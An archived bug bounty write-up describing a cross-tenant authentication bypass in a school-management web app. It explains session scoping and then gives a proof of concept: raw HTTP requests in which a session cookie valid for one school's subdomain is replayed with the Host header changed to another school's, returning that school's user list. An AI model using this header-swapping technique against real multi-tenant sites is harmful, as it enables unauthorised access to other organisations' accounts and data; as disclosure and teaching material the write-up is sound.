# missing session scopes lead to authentication bypass

- **Source URL:** https://medium.com/@Mr3Moe/missing-session-scopes-lead-to-authentication-bypass-2e1cdaebda7b?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20240105164014/https://medium.com/@Mr3Moe/missing-session-scopes-lead-to-authentication-bypass-2e1cdaebda7b
- **Fetched:** 2026-11-22
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/4700 (id 4700)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
**what’s session scopes**

The session data is scoped to the user’s session. This means that data stored in the session is only accessible to the specific user who initiated the session. Other users visiting the application will have their own separate sessions and session data.

let’s say for example there is two accounts let’s names these accounts **Bob** and **John** when **Bob** login into his account he will assigned with unique session that session works as identification to **Bob** only , and **Bob** can’t use that session on **John** account .

nor **John** can use his session on **Bob** account by missing session scopes both **Bob** and **John** can login into each other account .

**Introduction**

While I was testing a web application, I came across a program that uses Ruby on Rails as its backend. The concept of this web application is school management, where each school has its own subdomain. For example,

```
schoolbob.example.com
schooljohn.example.com
```
**Bob** and **John** can login using their own credentials on their respective subdomains. If you use Bob’s credentials on John’s login page, you will receive an error.

**Finding session scopes flaw**

After I noticed that logic, I decided to focus on bypassing it to gain access to John’s account from \`Bob’s\` account At first I tried **SQL injection** on login Form but I didn’t find anything interesting. then moved around for a little bit and then I rememberd a attack called [**reset password poisoning**](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning) .

I used the same logic of that attack in term of the **Host** and I was able to successfully bypass the Auth system here’s the POC

**POC**

1 — login into Bob account on schoolbob.example.com and open burp suite.

2 — after you successfully logged in go to any page in my case I Went to **Users page** the request look like that

```
GET /dashboard/Users/ HTTP/1.1
Host: schoolbob.example.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie:  _Session=[BobSession]; _ga_HG5D8M5XVV=GS1.1.1691547505.1.1.1691548585.0.0.0;
sec-ch-ua: "Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"
sec-ch-ua-mobile: ?0
sec-gpc: 1
```
3 — change the Host From **schoolbob.example.com** to any school subdomain you want to compromise for example john school **schooljohn.example.com**

```
GET /dashboard/Users/ HTTP/1.1
Host: schooljohn.example.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie:  _Session=[BobSession]; _ga_HG5D8M5XVV=GS1.1.1691547505.1.1.1691548585.0.0.0;
sec-ch-ua: "Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
sec-gpc: 1
```
4 — by sending the request in burp repeater I notice that the users I got in response actual belong to **John** and from That I was able to compromise **John** subdmoain .

5 — you could also copy the session from **Bob** open new browser paste the session in cookies section and done !!!
